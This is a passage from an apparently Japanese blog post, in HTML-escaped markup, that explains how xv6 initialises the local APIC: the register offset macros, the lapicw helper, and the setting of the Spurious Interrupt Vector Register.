&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;EOI&lt;/span&gt;     &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x00B0&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// EOI&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;SVR&lt;/span&gt;     &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x00F0&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Spurious Interrupt Vector&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;ENABLE&lt;/span&gt;     &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x00000100&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Unit Enable&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;ESR&lt;/span&gt;     &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0280&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Error Status&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;ICRLO&lt;/span&gt;   &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0300&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Interrupt Command&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;INIT&lt;/span&gt;       &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x00000500&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// INIT/RESET&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;STARTUP&lt;/span&gt;    &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x00000600&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Startup IPI&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;DELIVS&lt;/span&gt;     &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x00001000&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Delivery status&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;ASSERT&lt;/span&gt;     &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x00004000&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Assert interrupt (vs deassert)&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;DEASSERT&lt;/span&gt;   &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x00000000&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;LEVEL&lt;/span&gt;      &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x00008000&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Level triggered&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;BCAST&lt;/span&gt;      &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x00080000&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Send to all APICs, including self.&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;BUSY&lt;/span&gt;       &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x00001000&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;FIXED&lt;/span&gt;      &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x00000000&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;ICRHI&lt;/span&gt;   &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0310&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Interrupt Command [63:32]&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;TIMER&lt;/span&gt;   &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0320&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Local Vector Table 0 (TIMER)&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;X1&lt;/span&gt;         &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x0000000B&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// divide counts by 1&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;PERIODIC&lt;/span&gt;   &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x00020000&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Periodic&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;PCINT&lt;/span&gt;   &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0340&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Performance Counter LVT&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;LINT0&lt;/span&gt;   &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0350&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Local Vector Table 1 (LINT0)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;LINT1&lt;/span&gt;   &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0360&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Local Vector Table 2 (LINT1)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;ERROR&lt;/span&gt;   &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0370&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Local Vector Table 3 (ERROR)&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;MASKED&lt;/span&gt;     &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x00010000&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Interrupt masked&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;TICR&lt;/span&gt;    &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0380&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Timer Initial Count&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;TCCR&lt;/span&gt;    &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0390&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Timer Current Count&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;TDCR&lt;/span&gt;    &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x03E0&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Timer Divide Configuration&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;spurious-interrupt-vectorの設定とローカルapicの有効化&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#spurious-interrupt-vector%E3%81%AE%E8%A8%AD%E5%AE%9A%E3%81%A8%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%ABapic%E3%81%AE%E6%9C%89%E5%8A%B9%E5%8C%96&quot; aria-label=&quot;spurious interrupt vectorの設定とローカルapicの有効化 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Spurious Interrupt Vectorの設定とローカルAPICの有効化&lt;/h3&gt;
&lt;p&gt;先に進みます。&lt;/p&gt;
&lt;p&gt;この行では&lt;code class=&quot;language-text&quot;&gt;lapicw&lt;/code&gt;関数によって&lt;code class=&quot;language-text&quot;&gt;Spurious Interrupt Vector&lt;/code&gt;を設定してローカルAPICの有効化を行います。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Enable local APIC; set spurious interrupt vector.&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;SVR&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ENABLE &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;T_IRQ0 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; IRQ_SPURIOUS&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;lapicw&lt;/code&gt;関数はこの後も頻繁に使用される以下の関数です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; index&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; value&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  lapic&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;index&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; value&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  lapic&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;ID&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// wait for write to finish, by reading&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;index&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;value&lt;/code&gt;を引数として、&lt;code class=&quot;language-text&quot;&gt;lapic&lt;/code&gt;の値を書き換えます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;lapic[ID]&lt;/code&gt;のIDは&lt;code class=&quot;language-text&quot;&gt;lapic.c&lt;/code&gt;で&lt;code class=&quot;language-text&quot;&gt;(0x0020/4)&lt;/code&gt;と定義されています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;lapic[ID];&lt;/code&gt;は特に設定変更などを行っている処理ではなく、この値を参照させることで、その前に命令した&lt;code class=&quot;language-text&quot;&gt;lapic&lt;/code&gt;の書き込みが終了するのを待つことを目的としています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;lapicw(SVR, ENABLE | (T_IRQ0 + IRQ_SPURIOUS));&lt;/code&gt;の行について見ていきます。&lt;/p&gt;
&lt;p&gt;インデックスは&lt;code class=&quot;language-text&quot;&gt;SVR&lt;/code&gt;を指定しています。&lt;/p&gt;
&lt;p&gt;これは&lt;code class=&quot;language-text&quot;&gt;(0x00F0/4)&lt;/code&gt;として&lt;code class=&quot;language-text&quot;&gt;Spurious Interrupt Vector Register&lt;/code&gt;のオフセットを指します。&lt;/p&gt;
&lt;p&gt;以下記事に記載の通り、&lt;code class=&quot;language-text&quot;&gt;Spurious Interrupt Vector Register&lt;/code&gt;のbit8(&lt;code class=&quot;language-text&quot;&gt;0x100&lt;/code&gt;)をセットすることによってAPICを有効にすることができます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://wiki.osdev.org/APIC&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;APIC - OSDev Wiki&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;また、ローカルAPICが割込みを受信できるようにするためには、&lt;code class=&quot;language-text&quot;&gt;Spurious Interrupt Vector&lt;/code&gt;を設定する必要があります。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Spurious Interrupt Vector Register&lt;/code&gt;の下位8bitには&lt;code class=&quot;language-text&quot;&gt;Spurious Interrupt Vector&lt;/code&gt;のIRQ番号がマッピングされます。&lt;/p&gt;
&lt;p&gt;そのため、&lt;code class=&quot;language-text&quot;&gt;0x100&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;0x3f&lt;/code&gt;のORを取った&lt;code class=&quot;language-text&quot;&gt;0x13f&lt;/code&gt;が&lt;code class=&quot;language-text&quot;&gt;Spurious Interrupt Vector Register&lt;/code&gt;にセットされます。&lt;/p&gt;
&lt;p&gt;この下位ビット&lt;code class=&quot;language-text&quot;&gt;0x3f&lt;/code&gt;ですが、&lt;code class=&quot;language-text&quot;&gt;T_IRQ0 + IRQ_SPURIOUS&lt;/code&gt;の演算結果として登場しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;T_IRQ0&lt;/code&gt;などの値は&lt;code class=&quot;language-text&quot;&gt;traps.h&lt;/code&gt;で定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// These are arbitrarily chosen, but with care not to overlap&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// processor defined exceptions or interrupt vectors.&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;T_SYSCALL&lt;/span&gt;       &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;64&lt;/span&gt;      &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// system call&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;T_DEFAULT&lt;/span&gt;      &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;500&lt;/span&gt;      &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// catchall&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;T_IRQ0&lt;/span&gt;          &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;32&lt;/span&gt;      &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// IRQ 0 corresponds to int T_IRQ&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;IRQ_TIMER&lt;/span&gt;        &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;IRQ_KBD&lt;/span&gt;          &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;IRQ_COM1&lt;/span&gt;         &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;IRQ_IDE&lt;/span&gt;         &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;IRQ_ERROR&lt;/span&gt;       &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;IRQ_SPURIOUS&lt;/span&gt;    &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;31&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;https://wiki.osdev.org/APIC&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;OSDev Wiki&lt;/a&gt;の解説だと、&lt;code class=&quot;language-text&quot;&gt;Spurious Interrupt Vector&lt;/code&gt;にセットする一番簡単な値は&lt;code class=&quot;language-text&quot;&gt;0xff&lt;/code&gt;であると書かれていますが、xv6OSでは&lt;code class=&quot;language-text&quot;&gt;0x1f&lt;/code&gt;でした。&lt;/p&gt;
&lt;p&gt;(この理由はいまいちよくわかってません。。)&lt;/p&gt;
